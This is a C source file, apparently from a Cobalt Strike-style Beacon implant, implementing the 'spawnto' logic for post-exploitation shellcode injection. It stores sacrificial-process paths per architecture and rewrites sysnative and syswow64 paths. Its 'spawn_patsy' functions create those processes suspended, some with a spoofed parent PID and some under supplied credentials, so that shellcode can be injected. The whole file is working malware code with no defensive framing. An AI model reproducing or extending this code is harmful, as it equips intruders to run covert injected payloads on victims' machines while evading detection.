/*
* Functions related to spawning and injecting shellcode. Better to group these into one spot.
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "process.h"

/* spawn stuff?!? :) */
static char * spawn_x86 = NULL; /* TODO: Allocated buffer to hold spawn information however these need to be released with data_free(alloc) and alloc is currently lost. */
static char * spawn_x64 = NULL;

/* define where we will spawn to */
void command_spawnproc(char * buffer, int length, BOOL x86) {
	/* initialize our global values */
	if (spawn_x86 == NULL || spawn_x64 == NULL) {
		datap * alloc = data_alloc(512);  /* TODO this allocation is lost once called. sets the globals however and that space is reused as needed. Mask candidate? */
		spawn_x86 = data_ptr(alloc, 256);
		spawn_x64 = data_ptr(alloc, 256);
	}

	/* reset both of them */
	if (length == 0 || length > 256) {
		memset(spawn_x86, 0, 256);
		memset(spawn_x64, 0, 256);
	}
	/* set our x86 option */
	else if (x86) {
		memset(spawn_x86, 0, 256);
		memcpy(spawn_x86, buffer, length);
	}
	/* set our x64 option */
	else {
		memset(spawn_x64, 0, 256);
		memcpy(spawn_x64, buffer, length);
	}
}

/* resolve our spawnproc */
void spawnproc(char * dst, DWORD max, BOOL x86) {
	char temp[256];

	/* zero out temp */
	memset(temp, 0, 256);

	/* grab the right spawn value for our architecture. Account for the user's runtime override */
	if (x86) {
		if (spawn_x86 != NULL && strlen(spawn_x86) > 0) {
			_snprintf(temp, 256, "%s", spawn_x86);
		}
		else {
			_snprintf(temp, 256, "%s", setting_ptr(SETTING_SPAWNTO_X86));
		}
	}
	else {
		if (spawn_x64 != NULL && strlen(spawn_x64) > 0) {
			_snprintf(temp, 256, "%s", spawn_x64);
		}
		else {
			_snprintf(temp, 256, "%s", setting_ptr(SETTING_SPAWNTO_X64));
		}
	}

	/* need to resolve environment variables into dst */
	env_expand(temp, dst, max);
}

void spawn_populate(BOOL x86, char * cmdbuff) {
	/* update cmdbuff, appropriately */
	memset(cmdbuff, 0, 256);

#if defined _M_X64
	/* user wants an x86 process */
	if (x86) {
		spawnproc(cmdbuff, 256, x86);
	}
	/* x64 context */
	else {
		char * foundp = NULL;
		spawnproc(cmdbuff, 256, x86);

		/* replace sysnative with system32. Really. */
		foundp = strstr(cmdbuff, "sysnative");
		if (foundp != NULL) {
			char rest[256];
			memset(rest, 0, 256);

			/* get rid of the sysnative nonsense */
			memcpy(foundp, "system32", 8);
			foundp += 9; /* move ahead by 9 bytes */

			/* copy the rest of the data over to rest */
			memcpy(rest, foundp, strlen(foundp));
			foundp -= 1; /* move back by 1 byte */

			/* now, copy the data back to cmdbuff */
			memcpy(foundp, rest, strlen(rest) + 1);
		}
	}
#elif defined _M_IX86
	/* user wants to spawn an x64 process */
	if (!x86) {
		spawnproc(cmdbuff, 256, FALSE);
	}
	/* user wants an x86 process AND there is no WOW64 sub-system. Special case! (e.g., XP, x86-only Windows) */
	else if (!is_wow64(GetCurrentProcess())) {
		char * foundp = NULL;
		spawnproc(cmdbuff, 256, TRUE);

		/* replace syswow64 with system32 */
		foundp = strstr(cmdbuff, "syswow64");
		if (foundp != NULL) {
			memcpy(foundp, "system32", 8);
		}
	}
	/* user wants an x86 process */
	else {
		spawnproc(cmdbuff, 256, TRUE);
	}
#endif
}

BOOL spawn_patsy(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi) {
	char cmdbuff[256];

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);

	/* spawn it baby! */
	return execute_program_with_default_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken);
}

BOOL spawn_patsy_as(BOOL x86, char * domain, char * user, char * pass, PROCESS_INFORMATION * pi) {
	char cmdbuff[256];

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);

	/* spawn it baby! */
	return runas(domain, user, pass, cmdbuff, CREATE_SUSPENDED, pi);
}

BOOL spawn_patsy_u(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD ppid) {
	char cmdbuff[256];

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);

	/* spawn it baby! */
	return execute_program_with_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken, ppid);
}

